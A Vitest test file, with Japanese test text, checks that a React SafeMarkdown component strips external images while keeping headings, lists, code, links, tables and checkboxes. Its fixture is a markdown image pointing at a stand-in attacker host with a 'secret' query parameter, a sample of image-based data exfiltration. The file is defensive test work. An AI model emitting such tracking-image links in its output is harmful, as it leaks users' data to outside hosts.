import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { SafeMarkdown } from './SafeMarkdown'

const ATTACKER_IMAGE_URL = 'https://attacker.example/tracking.png?secret=1'

describe('SafeMarkdown', () => {
  it('外部画像を通信可能なDOMにせず、通常MarkdownとGFMを維持する', () => {
    const markdown = `# 見出し

通常文章です。

- リスト項目

\`inlineCode()\`

[通常リンク](https://example.com/docs)

![安全な代替テキスト](${ATTACKER_IMAGE_URL} "画像タイトル")

~~取り消し線~~

| 列 |
| --- |
| 値 |

- [x] 完了
`

    const html = renderToStaticMarkup(<SafeMarkdown>{markdown}</SafeMarkdown>)

    expect(html).not.toContain('<img')
    expect(html).not.toMatch(/<link[^>]+rel="preload"/)
    expect(html).not.toContain(ATTACKER_IMAGE_URL)
    expect(html).toContain('安全な代替テキスト')
    expect(html).toContain('<h1>見出し</h1>')
    expect(html).toContain('通常文章です。')
    expect(html).toContain('<li>リスト項目</li>')
    expect(html).toContain('<code>inlineCode()</code>')
    expect(html).toContain('<a href="https://example.com/docs">通常リンク</a>')
    expect(html).toContain('<del>取り消し線</del>')
    expect(html).toContain('<table>')
    expect(html).toContain('type="checkbox"')
    expect(html).toContain('完了')
  })
})
